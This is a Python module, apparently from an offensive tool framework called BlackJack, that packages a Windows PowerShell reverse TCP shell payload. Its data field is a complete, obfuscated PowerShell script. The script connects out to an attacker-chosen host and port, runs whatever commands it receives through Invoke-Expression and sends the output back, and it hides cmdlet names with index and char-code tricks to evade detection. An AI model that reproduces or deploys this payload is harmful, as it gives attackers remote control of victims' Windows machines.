# This module is part of the BlackJack framework

class Payload:

    info = {
        'Title' : 'Windows PowerShell Reverse TCP',
        'Author' : 'Unknown',
        'Description' : 'Classic PowerShell Reverse TCP',
        'References' : ['https://revshells.com']
    }

    meta = {
        'handler' : 'netcat',
        'type' : 'powershell-reverse-tcp',
        'os' : 'windows'
    }

    config = {}

    parameters = {
        'lhost' : None
    }

    attrs = {
        'encode' : True
    }

    data = """$TCPClient = & (("obdGh4FUBuNi9JrmKc0y3TnH7MjC1l-qIakAOY6WVvPE2QtDgXL8ZRp5sezSwxf")[10,57,60,30,36,1,26,57,17,46] -join '') Net.Sockets.TCPClient('*LHOST*', *LPORT*);$NetworkStream = $TCPClient.GetStream();$StreamWriter = & (("obdGh4FUBuNi9JrmKc0y3TnH7MjC1l-qIakAOY6WVvPE2QtDgXL8ZRp5sezSwxf")[10,57,60,30,36,1,26,57,17,46] -join '') IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize |%{$_}| % {0};$StreamWriter.Write($String);$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {& ([string]::join('', ( (73,110,118,111,107,101,45,69,120,112,114,101,115,115,105,111,110) |%{$($_)}|%{ ( [char][int] $($_))})) |%{$_}| % {$_}) $Command 2>&1 |%{$_}| & ([string]::join('', ( (79,117,116,45,83,116,114,105,110,103) |%{$_}|%{ ( [char][int] $_)})) |%{$_}| % {$($_)})} catch {$($_) |%{$_}| & ([string]::join('', ( (79,117,116,45,83,116,114,105,110,103) |%{$_}|%{ ( [char][int] $($_))})) |%{$($_)}| % {$_})}WriteToStream ($Output)}$StreamWriter.Close()"""
    
